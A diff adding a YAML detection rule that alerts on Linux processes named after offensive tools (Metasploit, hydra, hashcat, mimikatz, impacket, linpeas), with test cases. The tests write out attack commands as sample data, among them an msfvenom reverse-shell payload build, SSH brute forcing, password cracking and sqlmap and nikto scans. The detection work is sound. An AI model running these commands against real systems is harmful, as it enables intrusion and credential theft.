@@ -1,0 +1,86 @@
+name: linux_hack_tool
+mode: alert
+eval: |
+  (
+    e.process_name == "msfconsole" ||
+    e.process_name == "msfvenom" ||
+    e.process_name == "metasploit" ||
+    e.process_name == "hydra" ||
+    e.process_name == "medusa" ||
+    e.process_name == "john" ||
+    e.process_name == "hashcat" ||
+    e.process_name == "enum4linux" ||
+    e.process_name == "gobuster" ||
+    e.process_name == "dirb" ||
+    e.process_name == "nikto" ||
+    e.process_name == "sqlmap" ||
+    e.process_name == "wpscan" ||
+    e.process_name == "aircrack-ng" ||
+    e.process_name == "ettercap" ||
+    e.process_name == "responder" ||
+    e.process_name == "mimikatz" ||
+    e.process_name == "crackmapexec" ||
+    e.process_name == "evil-winrm" ||
+    e.process_name == "bloodhound" ||
+    e.process_name == "impacket-smbexec" ||
+    e.process_name == "impacket-psexec" ||
+    e.process_name == "impacket-wmiexec" ||
+    re_match(e.process_name, "^(linpeas|winpeas|linenum|linux-exploit-suggester|pspy)") ||
+    re_match(e.process_executable, "(linpeas|winpeas|linenum|pspy)")
+  )
+tests:
+  - cleartext: "msfconsole"
+    process_name: msfconsole
+    process_args: "msfconsole"
+    should_match: true
+  - cleartext: "msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf > shell.elf"
+    process_name: msfvenom
+    process_args: "msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf"
+    should_match: true
+  - cleartext: "hydra -l admin -P passwords.txt ssh://10.0.0.1"
+    process_name: hydra
+    process_args: "hydra -l admin -P passwords.txt ssh://10.0.0.1"
+    should_match: true
+  - cleartext: "john --wordlist=rockyou.txt hashes.txt"
+    process_name: john
+    process_args: "john --wordlist=rockyou.txt hashes.txt"
+    should_match: true
+  - cleartext: "hashcat -m 0 -a 0 hashes.txt rockyou.txt"
+    process_name: hashcat
+    process_args: "hashcat -m 0 -a 0 hashes.txt rockyou.txt"
+    should_match: true
+  - cleartext: "enum4linux -a 10.0.0.1"
+    process_name: enum4linux
+    process_args: "enum4linux -a 10.0.0.1"
+    should_match: true
+  - cleartext: "sqlmap -u 'http://vuln.com/?id=1' --dbs"
+    process_name: sqlmap
+    process_args: "sqlmap -u http://vuln.com/?id=1 --dbs"
+    should_match: true
+  - cleartext: "gobuster dir -u http://target.com -w wordlist.txt"
+    process_name: gobuster
+    process_args: "gobuster dir -u http://target.com -w wordlist.txt"
+    should_match: true
+  - cleartext: "./linpeas.sh"
+    process_name: linpeas
+    process_args: "linpeas.sh"
+    process_executable: "/tmp/linpeas.sh"
+    should_match: true
+  - cleartext: "nikto -h http://target.com"
+    process_name: nikto
+    process_args: "nikto -h http://target.com"
+    should_match: true
+  - cleartext: "ls -la (normal tool)"
+    process_name: ls
+    process_args: "ls -la"
+    process_executable: "/usr/bin/ls"
+    should_match: false
+  - cleartext: "vim server.py (normal tool)"
+    process_name: vim
+    process_args: "vim server.py"
+    should_match: false
+  - cleartext: "lesspipe (standard less helper, not a hack tool)"
+    process_name: lesspipe
+    process_args: "lesspipe"
+    process_executable: "/usr/bin/dash"
+    should_match: false
